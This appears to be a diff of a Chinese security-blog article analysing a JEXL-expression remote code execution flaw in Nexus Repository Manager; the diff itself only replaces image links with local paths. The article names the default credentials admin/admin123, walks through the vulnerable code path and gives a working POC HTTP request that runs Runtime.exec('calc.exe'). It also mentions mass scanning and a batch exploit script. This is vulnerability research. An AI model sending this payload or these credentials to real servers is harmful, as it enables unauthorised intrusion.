@@ -49,9 +49,9 @@ schema_version: "1"
 
   
 
-![](https://mmbiz.qpic.cn/mmbiz_png/siayVELeBkzWBXV8e57JJ4OyQuuMXTfadZCia0bN2sFBfdbTRlFx0S97kyKKjic5v6eaZ8cY4WQt0UEu4dkyowHYg/640?wx_fmt=png)
+![](../../.resource/remote/e4700f2588a58a9047e7224194a9c77ff109b7d1c2764141d4fe795b98f4e2d8.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/rl6daM2XiabyLSr7nSTyAzcoZqPAsfe5tOOrXX0aciaVAfibHeQk5NOfQTdESRsezCwstPF02LeE4RHaH6NBEB9Rw/640?wx_fmt=png)
+![](../../.resource/remote/af46b8914a59a6fd7ea711f37ab78ee50b3eb2f64f79fd083b21bf24ed4e3896.png)
 
 作者：掌控安全 - master
 
@@ -64,7 +64,7 @@ schema_version: "1"
 
 结果我用 Zoomeye 一搜, 竟然是中国人的天下。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NxXjvTtoUuH7309gGRC5n8Yo1ZGFrduicaDYEibYXJia9N1E7AG4LicKmHQ/640?wx_fmt=png)
+![](../../.resource/remote/6ff29fd32d286013006e126ad69718af6b22c71f3dc185aa3b7c6c1e2af484ab.png)
 
 事先声明，本文章仅用于学习交流，请勿用于其它用途！
 
@@ -89,7 +89,7 @@ nexus 存在弱口令 admin/admin123 可以进入。
 
 当然存在好多弱口令，不要瞎搞呀，上一个测试截图。
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nb07OTEQQicUo0qscN4icuZPNnvy9yt64NmK1qUibKnpJrYia8GQIfGeiaAA/640?wx_fmt=png)
+![](../../.resource/remote/977966fe50c01ee6e951b786d40f4b23f8d0175a2fcc024e7ebb827f63ccb1d8.png)
 
 如果说登录后还可以利用别的漏洞，这次不做研究，因为今天的主角不是他。
 
@@ -111,7 +111,7 @@ post 包解析
   
 首先先看一下 web.xml 中如何做的路由解析：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N5b9iaibSxMjMQTENB6ra3iabArFquxza3yPkCTZ79EATxdFmj7WBONvng/640?wx_fmt=png)
+![](../../.resource/remote/a315c874a522e9553d6a085ad8b90b38cc81efa39449e5c79b3798b6c81f7c56.png)
 
 org.sonatype.nexus.bootstrap.osgi.DelegatingFilter 拦截了所有的请求，
 
@@ -119,25 +119,25 @@ org.sonatype.nexus.bootstrap.osgi.DelegatingFilter 拦截了所有的请求，
 
 而该漏洞的入口就在 org.sonatype.nexus.extdirect.internal.ExtDirectModule#configure 中:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NZeu813HVicFgp0rkls3nzmibueYaK1N2Q0Gb3m2z0BblfMiaR0d791mNw/640?wx_fmt=png)
+![](../../.resource/remote/7251f24dd7b4edfb2870cd7f4cef5a905ddab7261e7883a762e3f9e329e5ec98.png)
 
 直接跟进 org.sonatype.nexus.extdirect.internal.ExtDirectServlet$doPost:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NHNapVbOicKnhqBLZJGibGNfQBosbVpcGJSrMwCz8sniaZ5gf9ahWkuYZg/640?wx_fmt=png)
+![](../../.resource/remote/c3cdcf5a5bb263016fdb79cc591f5d3fbb5a123a3c9bc56218c0761323801e7f.png)
 
 继续向下更进看到处理 post 请求的部分：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NkLkcJ46d7zNzxooqbhrOrzoricaeicksJ2c3K9SUgoahhJoSTkibj6EfA/640?wx_fmt=png)
+![](../../.resource/remote/4eb4d708aa7d9a6392aae31e596c6091540f2c735ea45c1de2a5973918a6dd74.png)
 
 在这里我们跟进看一下如何对 json 格式的请求进行处理：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NYyRKowS0rvsbsqjicEibOqRWicyU0jy9UDBj9um1C3M1P67rRiblibmlYhg/640?wx_fmt=png)
+![](../../.resource/remote/1157d17838ef4ba858b48797c11067e880f6ed167822f8d34f676b131d455a42.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NBfgyXmdTpR21O4714F829KBicibT3wmRRcic7Eq4JpVbtSnsibbKy2Gcpw/640?wx_fmt=png)
+![](../../.resource/remote/dd17728ef43046e0a88ef99535732ab190528d5dec4c5d312af33b7810a82a65.png)
 
 首先对 json 的语法树进行解析，将数据提取出来：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NjDRBoyGPX6C6icg9j3wqTJeoYqeq6xaibmgC7HcSdDnYURR3gBMU7icyA/640?wx_fmt=png)
+![](../../.resource/remote/637ee7499e8f0aefd0225c8996842737ebd2708a5bd3ed1680f5d0e8aa734068.png)
 
 可以看到需要 5 个变量分别为 action、method、tid、type、data。
 
@@ -145,7 +145,7 @@ org.sonatype.nexus.bootstrap.osgi.DelegatingFilter 拦截了所有的请求，
 
 之后就是传入 processIndividualRequestsInThisThread 方法中：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NkWsvLQdPqPWNpap4zlc8cZCxQJTR47T6QUXiaCwQAnZts5jIH82T5cQ/640?wx_fmt=png)
+![](../../.resource/remote/6b0081bd5a21d897160831fb32f2af9696bf17692fc5e1c7bec3db415b9ac7c9.png)
 
 在这里构造返回的结果，可以看到这里在有一个 json 序列化的过程，这里主要是将返回结果以 json 格式返回。
 
@@ -153,7 +153,7 @@ jexl 表达式执行，从 post 包的解析中可以得知我们需要构造 5 
 
 这个漏洞出现在 org.sonatype.nexus.coreui.ComponentComponent#previewAssets:
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NbDEnqkIVDLiczURk3qZMOdgIMZnN4tNibVsr7vouvd11r99Iic9yaZQLw/640?wx_fmt=png)
+![](../../.resource/remote/6b4f22fdbe966169a5dd58ee3cb112237458940db1b3a532b2d00c3213f75739.png)
 
 首先将 post 包中 repositoryName、expression、type 的值取出来
 
@@ -161,9 +161,9 @@ jexl 表达式执行，从 post 包的解析中可以得知我们需要构造 5 
 
 着重看一下 jexl 的处理过程：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nxld0mAhLzTiaecUsKubWFFgTSib9pgDSnRI8CMnAG623xya2KFtJRsUg/640?wx_fmt=png)
+![](../../.resource/remote/0391a5d1d5a6c24090b97d66753879e2bb8559d2d02f73c3a4915552315784fe.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5N6BHRh7TGxGyzKc0S07W0KzvXQ3OWJBSU5iawyr9R4ewRNic5M6k7KkUw/640?wx_fmt=png)
+![](../../.resource/remote/1c30ff82f9e083dfc8f81b8fae93e5d42ef508b1481cba1036573c614697a643.png)
 
 注意到这里只是实例化了一个 JexlSelector 对象，而并没有调用 evaluate 来执行表达式，所以漏洞的触发点在其他的位置。
 
@@ -171,11 +171,11 @@ jexl 表达式执行，从 post 包的解析中可以得知我们需要构造 5 
 
 跟进 previewAssets 的实现，在 org.sonatype.nexus.repository.browse.internal.BrowseServiceImpl#previewAssets：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NvJESll6iamnblP9icicg5AoXgkQZd0Y3ekvj37RjsJzXojyATr415rkCg/640?wx_fmt=png)
+![](../../.resource/remote/e9bf356346c2424e8fce49ea9ba75f402f54456ca3e150453f11283916b5129b.png)
 
 在这里可以看到表达式最后会被当做参数形成 SQL 查询，最后由 OrientDb 执行：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NeYJicR3W64PicDptvcNtaqyIU7vGdKSIAmPgFHzHdMAxQxwCjqeuJLBw/640?wx_fmt=png)
+![](../../.resource/remote/798b91da461652847f0a519c404b94b8ff84cf95340efe3b67f2b49d1bffa7b2.png)
 
 但是 OrientDb 本身是没有 contentExpression 这个方法的，
 
@@ -183,22 +183,22 @@ jexl 表达式执行，从 post 包的解析中可以得知我们需要构造 5 
 
 org.sonatype.nexus.repository.selector.internal.ContentExpressionFunction：  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NzuHYCibtyTMt5cXanTjygwOib1wgpwDpDOuVFvq7H3no3Tq2otZ8VhEA/640?wx_fmt=png)
+![](../../.resource/remote/647016e0698f90dcbe5c912ff2272168c4aa25963f4c7c366ca81e99c6cf0d34.png)
 
 在 checkJexlExpression 中：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NpPvcyhiaISHtLUAW5cu9fiaoCicg80PsftqIAh7z2rsYFdocLILkaJayg/640?wx_fmt=png)
+![](../../.resource/remote/3f92ced1ff7cba73d664b648e67c97731014cdd4a5d1680326028f205856cda9.png)
 
 调用了 selectorManage.evaluate 来执行 jexl 表达式：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NliasibM61DibPHnLUunwB3o62BX9nkrXYtkFkYChPSgxMIQlcH3I58GRw/640?wx_fmt=other)
+![](../../.resource/remote/9975eca18ea57afddb164c677770ff15321b3eea84683932c219e2a843356b5d.png)
 
 0X04
 ----
 
 利用脚本批量扫了一下，看到还是存在很多的。  
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5NoicEDm7pqOtaQ56q3x17fh8mKkJOWHicicrW8SWvpvuoOoBLPtSXrpaRw/640?wx_fmt=png)
+![](../../.resource/remote/a5216f1f34efc162c50de34e9b8ff52f503247d8c177e0ea86d5317b7c19d618.png)
 
 POC
 
@@ -206,13 +206,13 @@ POC
 POST /service/extdirect HTTP/1.1<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Host:127.0.0.1:8081<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:64.0) Gecko/20100101 Firefox/64.0<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Content-Type: application/json<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Content-Length: 308<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">Connection: close<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;"><br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">{"action":"coreui_Component","method":"previewAssets","data":[{"page":1,"start":0,"limit":25,"filter":[{"property":"repositoryName","value":"*"},{"property":"expression","value":"''.class.forName('java.lang.Runtime').getRuntime().exec('calc.exe')"},{"property":"type","value":"jexl"}]}],"type":"rpc","tid":4}<br style="max-width: 100%;word-wrap: break-word !important;box-sizing: border-box !important;overflow-wrap: break-word !important;">
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nvo5yVFuTdD1xyXSDdlM6icGyyUzHeyLFVkxqSkDP7Eoic5e3tnbvmC1Q/640?wx_fmt=png)
+![](../../.resource/remote/b20484169d792692f4c371cba541d9d3e6665f3bcb8c3e02ce40a8728e3dfcff.png)
 
 附件放一个批量脚本
 
 使用如图：
 
-![](https://mmbiz.qpic.cn/mmbiz_png/CBJYPapLzSGeYH4mRCThwafpMIh6mo5Nb68VMOIVWYKgXQyf0rdicm6NYGLibv4I9W6QzcOH8rdFtgiaNGav3ZAMA/640?wx_fmt=png)
+![](../../.resource/remote/918853e8ffca9e94fbace607653e06ff1e00acd1126666ea11fc72c480b120c6.png)
 
 **附件后台回复：“002”**
 
@@ -233,13 +233,13 @@ POST /service/extdirect HTTP/1.1<br style="max-width: 100%;word-wrap: break-word
 [实战纪实 | 从编辑器漏洞到拿下域控 300 台权限](https://mp.weixin.qq.com/s?__biz=MzUyODkwNDIyMg==&mid=2247487476&idx=1&sn=ac9761d9cfa5d0e7682eb3cfd123059e&chksm=fa687685cd1fff93fcc5a8a761ec9919da82cdaa528a4a49e57d98f62fd629bbb86028d86792&token=1892203713&lang=zh_CN&scene=21#wechat_redirect)
 --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
 
-![](https://mmbiz.qpic.cn/mmbiz_gif/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWaCD3pqD9SSJ3YMhuahjm3anU6mlEJaepA8qOwm3C4GVIETQZT6uHGQ/640?wx_fmt=gif)
+![](../../.resource/remote/553ceefc3b1479cc862f6f8900857ffa3da4352fd66ccb41e13c9b73baff07fa.gif)
 
 扫码白嫖视频 + 工具 + 进群 + 靶场等资料
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcpx1Q3Jp9iazicHHqfQYT6J5613m7mUbljREbGolHHu6GXBfS2p4EZop2piaib8GgVdkYSPWaVcic6n5qg/640?wx_fmt=png)
+![](../../.resource/remote/cfe2acf01f76856e34009a3a3c80c59c96367595d7f9dcf72cf3031cd3ac7641.png)
 
-![](https://mmbiz.qpic.cn/mmbiz_png/BwqHlJ29vcqJvF3Qicdr3GR5xnNYic4wHWFyt1RHHuwgcQ5iat5ZXkETlp2icotQrCMuQk8HSaE9gopITwNa8hfI7A/640?wx_fmt=png)
+![](../../.resource/remote/cc23fa1d3e8157e15633c47bc376e29fa74b67c7beeba492c693ff51db3d83c5.png)
 
  **扫码白嫖****！**
 
